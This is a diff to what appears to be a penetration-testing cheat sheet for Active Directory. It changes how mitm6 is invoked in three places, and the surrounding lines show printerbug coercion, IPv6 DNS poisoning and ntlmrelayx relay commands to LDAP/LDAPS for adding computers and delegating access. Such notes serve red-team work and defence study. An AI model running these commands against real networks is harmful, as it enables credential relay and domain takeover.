@@ -107,7 +107,7 @@ python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
 - Spoof any requests for internal resources
 
 ```
-sudo mitm6 -d <DOMAIN> --ignore-nofqdn
+sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
 ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
 ```
 
@@ -118,7 +118,7 @@ ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
 #### Enable the LDAPS relay
 - Can wait for mitm6 to poison or force it
 ```
-sudo mitm6 -d <DOMAIN> --ignore-nofqdn
+sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
 
 ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
 ```
@@ -150,7 +150,7 @@ python3 LdapRelayScan.py -method LDAPS -dc-ip <IP>
 
 #### Start mitm6 and NTLMRelay
 ```
-sudo mitm6 -d <DOMAIN> --ignore-nofqdn
+sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
 sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access 
 ```
 
